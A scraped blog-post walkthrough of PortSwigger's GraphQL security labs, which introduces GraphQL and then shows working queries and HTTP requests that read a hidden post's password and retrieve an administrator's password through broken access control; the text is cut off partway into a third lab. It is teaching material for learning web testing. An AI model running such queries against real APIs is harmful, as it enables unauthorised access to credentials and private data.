---
title: Mastering the Realm of GraphQL Exploitation
url: https://buaq.net/go-174342.html
source: unSafe.sh - 不安全
date: 2023-08-14
fetch_date: 2025-10-04T11:59:15.783791
---

# Mastering the Realm of GraphQL Exploitation

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

Mastering the Realm of GraphQL Exploitation

Hey Infosec mates,In this blog, we embark on a journey about Hacking GraphQL. Whether you’re a curio
*2023-8-13 20:1:14
Author: [infosecwriteups.com(查看原文)](/jump-174342.htm)
阅读量:17
收藏*

---

[![7h3h4ckv157](https://miro.medium.com/v2/resize:fill:88:88/1*9mnRI2Qy4hvsv6pEJnfBMQ.jpeg)](https://7h3h4ckv157.medium.com/?source=post_page-----a12ed5e04263--------------------------------)[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:48:48/1*A6LVtmXcJ3QJy_sdCyFx1Q.png)](https://infosecwriteups.com/?source=post_page-----a12ed5e04263--------------------------------)

Hey Infosec mates,

In this blog, we embark on a journey about Hacking GraphQL. Whether you’re a curious enthusiast eager to explore the latest advancements in web technologies, this comprehensive guide will serve as your compass through the intricacies of GraphQL

* **What is GraphQL**?

GraphQL is an efficient approach to building and consuming APIs, it provides a flexible and intuitive way to query and retrieve data. Instead of relying on fixed endpoints like in REST APIs, developers can send a single GraphQL query to request specific data fields from the server. This reduces the number of API calls needed and allows developers to fetch all the required data in a single request, improving performance.

It has a vibrant ecosystem with a wide range of tools, libraries, and frameworks available for various programming languages. These tools simplify the implementation and integration of GraphQL in different environments, making it accessible and convenient for developers to adopt. GraphQL also supports real-time data updates through its subscription mechanism.

Developers can establish a subscription to receive real-time updates whenever certain data changes on the server. This is particularly useful for building real-time applications, chat systems, or collaborative platforms where immediate data updates are crucial.

[Credit](https://twitter.com/alexxubyte/status/1687480822046351361?t=F0xYMAZuI99Y71Bx1FQEJg&s=09)

> Imagine you have a bunch of toys scattered around your room, and you want to organize them. Instead of picking up each toy one by one and telling someone where it belongs, you can create a list of all the toys and describe what they are. This list is like GraphQL.
>
> In GraphQL, you create something called a schema. It’s like a map that tells the computer what kinds of information it can ask for and how it should respond. The schema defines different types of information, like toys, and what each toy has, such as its name, color, and size.
>
> When a computer wants to get information about a specific toy, it can send a GraphQL query. It’s like asking a question. For example, it can say, “Hey computer, I want to know the name and color of the toy with ID number 123.” The computer then reads the query and responds with the requested information.

GraphQL is helpful because it allows computers to get exactly what they need. It’s like giving someone a shopping list with specific items instead of telling them to bring everything from a store. This makes things faster and more efficient because computers only get the data they want, instead of getting a lot of unnecessary information.

One of my Favorite tweets about GraphQL:

> *For More, Research:* [*GraphQL*](https://www.google.com/search?q=GraphQL)

> *I’m excited to explore the Portswigger Lab’s GraphQL API vulnerabilities. Whether you are a beginner or an experienced cybersecurity enthusiast, this walkthrough will equip you with the knowledge necessary to identify and mitigate GraphQL API vulnerabilities*

## Lab 1 → [Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)

> **Challenge description:** The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password

> If you’re Pen-Testing GraphQL, “InQL — Introspection GraphQL Scanner” is the best extension which must be installed on your BurpSuite.

**How to Hack:**

While accessing the lab, we can see some blog post in it.

The challenge is to find hidden blog post and enter the password.

There’re total 4 Posts visible to us. Their ID values are: 1,5,2,4

* post?postId=1
* post?postId=5
* post?postId=2
* post?postId=4

Simple Guess: The ID value 3 is not listed. While visiting the URL, which will returns: “Not Found”

But in HTTP History, you can see the end point sending GraphQL Queries:

```
POST /graphql/v1 HTTP/1.1
```

The Notable thing is the Server returns the blog associated with the specific ID we provided as our input. By changing the value to 3 from repeater, we can see the hidden blog without any barrier.

```
”operationName”:”getBlogPost”,”variables”:{“id”:3}}
```

Our next task is to find the password. For this we can send the request to **InQL Scanner**. We can figure out some juicy information:

```
query {
 getBlogPost(id:1334) {
  date
  summary
  image
  author
  isPrivate
  title
  paragraphs
  id
  postPassword
 }
}
```

> The “postPassword” is only needed in our request to retrieve the password

**Pwned!**

> Lab 2 → [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
>
> **Challenge description:** The user management functions for this lab are powered by a [GraphQL](https://portswigger.net/web-security/graphql) endpoint. The lab contains an [**Access control**](https://portswigger.net/web-security/access-control) **vulnerability** whereby you can induce the API to reveal user credential fields. To solve the lab, sign in as the administrator and delete the username “carlos”

**How to Hack:**

The 1st thing I noticed was Login Form, I simply Logged in with the default credentials: wiener & peter

Thischallenge was pretty easy, & direct. While the target scanned using InQL Scanner, the getUser.query was itself juicy

```
query {
 getUser(id:1334) {
 password
 id
 username
 }
}
```

By simply sending the same into the repeater tab & change the id to 1, we’ll get Admin details. I was about to analyze the results, but at the initial try itself, I got the details that needed

**Request**:

```
POST /https://xxxx.web-security-academy.net:443/graphql/v1?query=%0A%20%20%20%20mutation%20changeEmail(%24input%3A%20ChangeEmailInput!)%20%7B%0A%20%20%20%20%20%20%20%20changeEmail(input%3A%20%24input)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20email%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A&variables=%7B%22input%22%3A%20%7B%22email%22%3A%20%22me%40me%22%7D%7D HTTP/1.1
Accept-Encoding: gzip, deflate
Connection: close
User-Agent: 7h3h4ckv157
Host: localhost:5612
Content-Length: 77
Content-Type: application/json

{"query": "query {\n\tgetUser(id:1) {\n\t\tid\n\t\tusername\n\tpassword}\n}"}
```

**Result:**

```
HTTP/1.0 200 OK
Server: BaseHTTP/0.3 Python/2.7.3
Date: Sat, 05 Aug 2023 11:28:23 GMT
Access-Control-Allow-Origin: http://localhost
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: Content-Type
Content-Type: application/json

{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "...here......."
    }
  }
}
```

Pretty easy, right??

**Pwned!**

> Just Login as Administrator using the returned credentials & delete the user carlos.

## Lab 3 → [Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

> **Challenge description:** The user management functions for this lab are powered by a hidden [Gra...